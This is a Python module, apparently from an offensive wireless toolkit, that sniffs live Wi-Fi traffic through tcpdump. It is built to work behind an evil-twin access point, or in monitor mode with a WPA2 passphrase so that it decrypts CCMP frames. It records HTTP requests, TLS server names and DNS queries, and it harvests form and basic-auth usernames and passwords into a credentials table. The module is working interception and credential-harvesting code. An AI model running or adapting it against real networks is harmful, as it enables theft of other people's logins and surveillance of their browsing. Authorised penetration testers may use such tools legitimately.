"""Live sniffing: HTTP requests, HTTPS names and DNS as they happen.

``wifi.tls`` answers "what is in this capture", after the fact. This answers
"what is this client doing right now": it decodes the pcap that ``tcpdump``
streams to stdout and prints each HTTP request, form/basic credential, TLS SNI,
certificate name and DNS question the moment it completes — while still saving
the capture, so ``wifi.extract`` can mine it later for files and bodies.

Point it at the twin's AP interface for plaintext, or at a monitor interface
with ``PSK=`` (the SSID comes from the beacons) so CCMP frames are decrypted
in memory on the way past.
"""

from __future__ import annotations

import json
import os
import time

from omni.core import config, console, proc
from omni.core.module import Option
from omni.wifi import iface as iface_mod, sniff as sniff_mod
from omni.wifi.modules._base import WifiModule

__all__ = ["Sniff"]


class Sniff(WifiModule):
    NAME = "wifi.sniff"
    DESCRIPTION = "Sniff HTTP requests + HTTPS/DNS names live, or decode a capture"
    OPTIONS = (Option("IFACE", "interface to capture on"),
               Option("MON", "put that adapter in monitor mode", "false",
                      choices=("true", "false")),
               Option("PCAP", "decode this capture instead of capturing"),
               Option("PSK", "WPA2 passphrase: decrypt CCMP frames live"),
               Option("SSID", "SSID for the PSK (beacons fill it in)"),
               Option("SECONDS", "capture length", "30"),
               Option("FILTER", "tcpdump filter (e.g. 'tcp port 80')"),
               Option("LIVE", "print events as they arrive", "true",
                      choices=("true", "false")),
               Option("OUT", "output directory"))

    def execute(self) -> dict:
        out = os.path.expanduser(self.get("OUT") or os.path.join(
            config.output_dir("wifi/sniff"), time.strftime("%Y%m%d_%H%M%S")))
        os.makedirs(out, exist_ok=True)
        source = os.path.expanduser(self.get("PCAP")) if self.get("PCAP") else ""
        if source and not os.path.isfile(source):
            raise FileNotFoundError(f"no such capture: {source}")
        if not source:
            proc.require("tcpdump", "apt install tcpdump to capture here")

        sniffer = sniff_mod.Sniffer(
            pcap_path=os.path.join(out, "traffic.pcap"),
            jsonl=os.path.join(out, "sniff.jsonl"),
            psk=self.get("PSK"), ssid=self.get("SSID"), bpf=self.get("FILTER"),
            on_event=sniff_mod.live_printer(not self.get_bool("LIVE", True)))
        monitor = ""
        try:
            if source:
                sniffer.iface = self.get("IFACE")
                console.info(f"decoding {source}")
                sniffer.read_file(source)
            else:
                if self.get_bool("MON", False):
                    monitor = self.monitor()
                    iface = monitor
                else:
                    iface = self.get("IFACE") or iface_mod.pick(None)
                sniffer.iface = iface
                seconds = max(1, self.get_int("SECONDS", 30))
                console.info(f"capturing on {iface} for {seconds}s "
                             f"(filter: {self.get('FILTER') or 'none'})")
                sniffer.start()
                deadline = time.time() + seconds
                try:
                    while time.time() < deadline:
                        time.sleep(0.2)
                except KeyboardInterrupt:
                    console.warn("stopped early")
                finally:
                    sniffer.stop()
        finally:
            sniffer.close()
            if monitor:
                self.restore(monitor)

        report = sniffer.report()
        report["outdir"] = out
        report["source"] = source or sniffer.iface
        self._print(report)
        with open(os.path.join(out, "sniff.json"), "w", encoding="utf-8",
                  newline="\n") as fh:
            json.dump(report, fh, indent=2)
            fh.write("\n")
        console.ok(f"{len(report['http'])} request(s), {len(report['hosts'])} "
                   f"host(s), {len(report['creds'])} credential(s) -> {out}")
        if not report["http"] and not report["hosts"]:
            console.warn("nothing decoded — plaintext needs the AP/uplink "
                         "interface, or a monitor interface plus PSK=")
        return report

    def _print(self, report: dict) -> None:
        """The end-of-run read-out: what it saw, in three blocks."""
        console.section("http")
        if report["http"]:
            console.table(["method", "url", "bytes"],
                          [[m["method"], m["url"], str(m["bytes"])]
                           for m in report["http"][:40]])
        else:
            console.info("no plaintext requests")
        if report["creds"]:
            console.section("credentials")
            console.table(["source", "user", "pass"],
                          [list(c) for c in report["creds"][:40]])
        if report["hosts"]:
            console.section("names (SNI / certificate / DNS)")
            console.table(["host"], [[name] for name in report["hosts"][:40]])
        console.kv([("link type", report["link"]),
                    ("frames", str(report["frames"])),
                    ("tcp segments", str(report["tcp_segments"])),
                    ("frames decrypted", str(report["decrypted"]))])
